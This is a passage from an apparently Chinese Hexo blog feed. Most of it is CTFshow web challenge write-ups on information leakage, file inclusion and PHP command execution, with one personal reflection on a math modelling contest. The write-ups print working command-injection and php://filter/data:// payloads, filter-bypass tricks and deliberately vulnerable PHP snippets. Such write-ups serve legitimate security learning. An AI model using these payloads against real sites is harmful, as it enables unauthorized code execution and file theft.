title="Web109"></a>Web109</h3><p>这玩意，我怎么说呢，我真不会，这一块也是学了一些新的东西</p><p>Exception 异常处理类 <a href="http://c.biancheng.net/view/6253.html">http://c.biancheng.net/view/6253.html</a> </p><h3 id="Web111"><a href="#Web111" class="headerlink" title="Web111"></a>Web111</h3><blockquote><p>变量覆盖，这里应该考察的就是全局元素</p></blockquote><h3 id="Web112"><a href="#Web112" class="headerlink" title="Web112"></a>Web112</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了data和base64，但是怎么说呢，过滤了这个偏偏可以想着如何绕过这个过滤……..这种情况大概是非预期解</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/convert.%2562ase64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学建模反思</title>
      <link href="/2022/03/12/%E6%95%B0%E6%A8%A1%E5%8F%8D%E6%80%9D/"/>
      <url>/2022/03/12/%E6%95%B0%E6%A8%A1%E5%8F%8D%E6%80%9D/</url>
      
        <content type="html"><![CDATA[<center><h3>数学建模反思</h3></center>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;怎么说呢，2月18日上午六时至2月23日，第一次正式参与一次数学建模比赛，最大的感受是夭寿啊。18日省外同学开学，19日省内同学报道，然后省赛时间就是在这期间......<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一次参与，也没啥经验，感觉从报名开始就充满了意外……团队队长本来希望能够在学校报名的时候报名比赛，然后,学校没有组织学校报名，18号开始比赛，17号才从赛氪的平台辅助报名（当时我真的疯了）。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当天联系老师，报名，下午三四点终于弄完报名了，然后18号省外的队友，来到曲师，我们在线上进行选题。在选题的时候实际上出了一些问题，我和另一位队友选择了F题<strong>全人类都在为探索太空而努力 太空资源应被全人类所利用</strong>。这个时候我们团队里学模型的同学因为正在赶往学校，没有参与选题，我们在确定了这个题目之后，查找了大量的材料，我们的另一个队友事后跟我们讲述，她在假期自学的时候，她并没有完成这个类型题目的学习,基本是被我们两个推上了战车….</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19日我抵达日照，在稍微修整之后与先到达的同学进行了交流，当天下午在人员到齐后交流情况，整理资料，怎么说呢？因为前期准备不足我们的数学建模在过去36个小时候终于步入正轨。从19至21号晚我们团队花费两天多的时间完成了数学建模，22号一夜，通宵整理和翻译，在早上六点左右完成了数学建模论文，虽然我们最后在结束前做完了整个数学建模。但是有各种不满意吧…..全程是在现学和现卖….在过程中第一次通宵也出现了虽然在忙，但是完全不知道自己在忙什么的现象。在比赛中还自己犯傻不会用学校的知网账号，自己花钱去买论文(在知道学校知网账号可以用的时候我人已将傻了。)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;到了22号上午7点，我们终于完成了整个数学建模，全程通宵三次，旷课两天,最后结果还行。</p><blockquote><p> 太空探索逐渐成为人类社会发展的一个重要的方向，小行星资源也成了各国争相开发开采的目标。如何在《外层空间条约》框架下实现各国的公平并且合理的使太空资源惠及全球？首先，我们围绕外层空间和公平性两个关键词进行探索。结合对公平的认识，我们通过定义一些指标给公平进行定义，并通过指标衡量一个国家的公平性。为确保数据真实可用，数据全部来源于，联合国教科文组织，国际货币基金组织，联合国开发计划署等权威机构。通过分析现有数据，进行合理的规划预测，我们建立了一个完善的公平评判模型，进行对各国公平性地衡量。 </p></blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最大的问题是我们在学习的时候，我们发现三个人学习的时候，实在是太过于分散，在一个队友忙碌的时候，很难提供有效的帮助，我假期没有学习数模的模型内容，仅仅学习了matlab相关知识…..下次再准备数模的时候，第一点肯定是要学习更多的模型，令一方面我们也必须要求掌握的知识进行协调。</p><p>最后，我选这一个看上去高大上的全球议题，其实很幼稚，我很希望能够为这个世界做点什么，但是却也很清楚，看向整个世界又无能为力，追求公平？问题又是出在这个公平,基于人类每个人平等的公平？基于现实的公平？我期待能够建立一个基于现实同时能够兼顾全人类的公平。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后发现，不过是自欺欺人的假象罢了……在我们设计了种种补偿机制后，发现即使在这样的情况下，外空的平等也似乎是天方夜谭，<strong>人类的共同财产</strong>或许只能是一个成人童话 , 弱小就是原罪。</p>]]></content>
      
      
      <categories>
          
          <category> 个人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow专题一</title>
      <link href="/2022/03/09/CTFshow%E4%B8%93%E9%A2%98%E4%B8%80/"/>
      <url>/2022/03/09/CTFshow%E4%B8%93%E9%A2%98%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="专题一：信息收集"><a href="#专题一：信息收集" class="headerlink" title="专题一：信息收集"></a>专题一：信息收集</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>直接查看源代码得到flag</p><h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>这道题应该是通过JS代码组织了右键及F12打开源代码的方式。在前面添加 view-source: 就可以查看源代码，也可以通过浏览器打开开发者工具打开源代码查看。</p><h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p>题目的官方解法是通过burpsuite抓包 flag在返回的响应头里面。但是抓包什么的确实是麻烦，F12就能直接看到…</p><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p>考点是robots.txt文件，直接访问url/robots.txt获得flag </p><p>关于robot协议</p><blockquote><p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”RobotsExclusionProtocol，网站通过Robots协议告诉搜索引擎哪些页面不能抓取。</p><p>怎么说呢？Robots协议是一种君子协议， 并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私 </p></blockquote><h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><p>考点phps文件泄露，直接访问index.phps。获得flag </p><h3 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#解压源码到当前目录，测试正常，收工</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考察代码泄露。众所周知源码文件夹一般是叫做<a href="http://www.zip,按照提示,可以知道www.zip文件应该是直接落在根目录里了,直接访问url/www.zip,%E8%8E%B7%E5%BE%97flag">www.zip,按照提示，可以知道www.zip文件应该是直接落在根目录里了，直接访问url/www.zip,获得flag</a> </p><p>Web7  </p><p>考察git代码泄露，直接访问url/.git/index.php </p><p>Web8  </p><p>考察信息svn泄露,直接访问url/.svn/ </p><p>Web9 </p><p> 考察vim缓存信息泄露，直接访问url/index.php.swp </p><blockquote><p> 临时文件是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容 </p></blockquote><p>Web10 </p><blockquote><p>cookie 只是一块饼干，不能存放任何隐私数据 </p></blockquote><p> 直接F12，在请求数据包,在cookie里面就有flag。</p><p>Web11</p><blockquote><p> 域名其实也可以隐藏信息，比如<strong>ctfshow</strong>.com 就隐藏了一条信息 </p></blockquote><p>这个我确实是第一次知道， 通过dns检查查询flag <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT 记录，一般指为某个主机名或域名设置的说明。 </p><p>Web12</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">有时候网站上的公开信息，就是管理员常用密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个算是有些社会工程学的内容了，账号admin加弱密码，虽然对专业用户来讲不怎么现实，但是真的不是每个人都是专业用户，在一些高校，特别是高校下属的二级学院，学院官网的管理员账号就是admin+办公室电话号,这种其实是十分不安全的。</p><p>Web13</p> <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 在页面下面发现 document.png下载发现里面存在后台地址和用户名密码登录成功获 得flag </p><p>Web14</p><p>泄露重要(editor)的信息 直接在url后面添加/editor 然后查看flag路径并且访问 </p><p>Web15</p><p>访问/admin页面 发现有一个忘记密码操作，需要输入地址,在主页面下面看到QQ邮箱，通过QQ号查询邮箱，是西安的 修改密码成功，用户名 admin 登录成功获得flag。</p><p>这个还是算是一种社会工程吧，这个拓展的说一下，像QQ的密保一样，那个密保的部分问题甚至在QQ号的公开信息上能够找到。</p><p>Web16</p><p> 对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露 </p><p>考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag </p><p>Web17</p><pre class="line-numbers language-none"><code class="language-none">备份的sql文件会泄露敏感信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接查看backup.spl就行。</p><p>Web18</p><p> 玩到101分给你flag……..查看js文件，查看flag的条件，去通过uncode中文解码。 访问110.php </p><h3 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h3><p> 前端查看源代码，post提交用户名密码 …..</p><h3 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h3><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag </p><p><del>flag{ctfshow_old_database}</del></p><h2 id="专题二：爆破"><a href="#专题二：爆破" class="headerlink" title="专题二：爆破"></a>专题二：爆破</h2><p>关于这个专题，至少我做的很难受….CTFshow因为之前受到了攻击,现在限制了访问频率…..这导致爆破这个专题的几道题目做着极其困难，每分钟10次就21题那个库还有4000+的密码量，爆破需要六个以上小时……</p><hr><h3 id="Web21"><a href="#Web21" class="headerlink" title="Web21"></a>Web21</h3><p> Payload set —-&gt;custom iterator(自定义迭代器) </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow之web入门---命令执行</title>
      <link href="/2022/03/05/CTFshow%E4%B9%8Bweb%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/03/05/CTFshow%E4%B9%8Bweb%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="简单执行："><a href="#简单执行：" class="headerlink" title="简单执行："></a>简单执行：</h2><h3 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h3><p>怎么说呢，这个只过率了flag这个字符,能够构造的挺多的。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac fla*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#system：执行系统命令，在通过占位符?或者*可以实现指令。</span><span class="token operator">/</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'tac *'</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'cat *'</span><span class="token punctuation">;</span><span class="token comment">#eval()函数就是把输入的字符串当作php代码去执行，直接打开可以看到。</span><span class="token comment">#在这里使用了，tac指令，这个跟cat指令效果相似，tac指令从最后一行倒序显示内容，并将所有内容输出</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`nl fl''ag.php`</span><span class="token punctuation">;</span><span class="token comment">#nl 可以将输出的文件内容自动的加上行号，这个是ctfshow官方wp里给的解法，但是我确实没怎么用过</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有这一种方式，使用cp指令flag.php中的文件写入2.txt，直接打开就能得到flag。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token string backtick-quoted-string">`cp fla?.??? 2.txt`</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token number">2.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><p>这个你上一问多过滤了 <code>system</code> ，由于过滤了system,我们可以使用passthru函数进行替代。</p><blockquote><p><strong>passthru()</strong></p><p>原型： void passthru ( string $command [, int &amp;$return_var ] )</p><p>说明: passthru与system的区别，passthru直接将结果输出到游览器，不返回任何值，且其可以输出二进制</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat f*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#注上个题的那些除了第一个被过滤了，都可以用。</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><p>循序渐进，这道题目比之前的又多过滤了空格与cat，使用<code>%09</code>绕过： cat也可以用tac进行替换。cp指令因为.被ban了这里也无法执行，具体也不难。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac%09f*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span><span class="token operator">%</span><span class="token number">09</span><span class="token string single-quoted-string">'tac%09*'</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span><span class="token operator">%</span><span class="token number">09</span><span class="token string backtick-quoted-string">`nl%09f*`</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这道题也可以进行逃逸。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat%20flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p> 这次又过滤了<strong>echo</strong>函数，**?&gt;**可以绕过<code>;</code>，比较麻烦的还是他把括号也一并过滤了，使用命令逃逸加文件包含：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 因为使用<code>?&gt;</code>，所以后面没办法直接拼接php语句，需要使用文件包含。 解码就得到flag。</p><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><p>这个题比上一道只多过滤了括号，但是这种逃逸接文件包含完全不需要括号，所以变化不大。</p><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><p>这个真就是经典ployed了 ，这道题多过滤了：但是实际上一开始构造的就是这种，基本上没什么变化。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><p>跟上面那个一样…..虽然在过滤时多过滤了一个=和一个&lt;，但是在之前的构造的，已经通过<code>?c=eval($_GET[1]);</code>逃逸了.</p><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><p>连着3个了…..这个[0-9]被过滤，这边可以直接用a代替。</p><h2 id="DATA伪协议相关："><a href="#DATA伪协议相关：" class="headerlink" title="DATA伪协议相关："></a>DATA伪协议相关：</h2><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p>这个考察的php中的data伪协议，换考点之后过滤的返回少了….基本上用类似方法第29题构造的都可以拿来用。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">/?c=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac fla?.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>/?c=data:text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac fla*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>#当然也可以用cp指令或者mv指令将flag文件复制出来再访问。/?c=data:text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?</span> cp fla<span class="token operator">?</span><span class="token operator">.</span><span class="token operator">??</span><span class="token operator">?</span> <span class="token number">1.</span>txt`<span class="token punctuation">;</span><span class="token delimiter important">?></span></span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Web38"><a href="#Web38" class="headerlink" title="Web38"></a>Web38</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|php|file/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一道题，他多过滤了PHP，php语言因为向下兼容的原因，可以有<code>&lt;?php ?&gt;</code> , 也可以使用简短标签<code>&lt;? ?&gt;</code> ,同时还具有ASP风格<code>&lt;% %&gt;</code> ，这种不同的配置里应该需要在配置文件<strong>php.ini</strong>里面更改设置。</p><p>所以在这道题，我们可以使用短标签<code>/?c=data:text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;</code> ，同时也可以用Base64编码进行绕过<code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></p><h3 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h3><p>在php文件里有这一句**include($c.”.php”); **，会将我们传入的文件的拓展名改为.php ,但是在我们的构造的过程中，data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">?c=data:text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac%20fla*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="重定向相关："><a href="#重定向相关：" class="headerlink" title="重定向相关："></a>重定向相关：</h2><h3 id="Web42"><a href="#Web42" class="headerlink" title="Web42"></a>Web42</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题跟前几道又有差别了，这次对进行了重定向，这个题按以往的方式无法进行。</p><p>1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，也就是不显示任何信息。<br>2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p><blockquote><p>1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>2：/dev/null 代表空设备文件<br>3：2&gt; 表示stderr标准错误<br>4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>5：1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于 “1&gt;/dev/null”<br>因此，&gt;/dev/null 2&gt;&amp;1 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>c<span class="token operator">=</span>tac flag<span class="token operator">.</span>php<span class="token punctuation">;</span>ls<span class="token operator">/</span><span class="token operator">?</span>c<span class="token operator">=</span>more flag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">0</span>a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>这道题目，跟上一道题目类似，多过滤了;和cat，这里是转载的一些关于分隔符的内容。</p><blockquote><p>1、“;”分隔符<br>用分号分隔的命令会按顺序执行，即使中间命令使用方式不对，会有相关错误输出，后面的命令照样会执行。如：</p><p>输入：命令A；命令B；命令C</p><p>按顺序执行A、B、C命令，若B命令调用方式不对，终端会有相关错误提示，提示后会继续执行C命令。</p><p>2、“&amp;&amp;”分隔符<br>同C、C++语言逻辑运算符”&amp;&amp;”类似，遇到首个命令执行失败后，后面的命令不会执行。如：</p><p>输入：命令A &amp;&amp; 命令B &amp;&amp; 命令C</p><p>先执行命令A，若A命令执行正确则再执行命令B。假如命令B执行失败，则停止，C命令不会被执行到。</p><p>3、“||”分隔符<br>同C、C++语言逻辑运算符”||”类似，遇到首个命令执行成功后，后面的命令不会执行。如：</p><p>输入：命令A || 命令B || 命令C</p><p>先执行命令A，若A命令执行失败则再执行命令B。假如命令B执行成功，则停止，C命令不会被执行到。</p></blockquote><p>在这里就可以直接用上一道题的pyload改造一下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">20</span>flag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">26</span><span class="token comment">#&amp;&amp;这个在使用时，应该使用urlencode为%26%26，否则会被当作url参数的分隔符而不是shell命令的分隔符。</span><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">20</span>flag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span><span class="token class-name">ls</span><span class="token operator">?</span>c<span class="token operator">=</span>more<span class="token operator">%</span><span class="token number">20</span>f<span class="token operator">*</span><span class="token operator">%</span><span class="token number">0</span>a<span class="token comment">#Linux的more指令，more指令的优先级貌似比重定向的>更高，使用more指令可以直接略过这个问题</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h3><p>这个题目过滤了flag，还是和以前一样使用在通过占位符?或者*可以实现指令。</p> <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">20</span>fla<span class="token operator">*</span><span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span><span class="token class-name">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Web45"><a href="#Web45" class="headerlink" 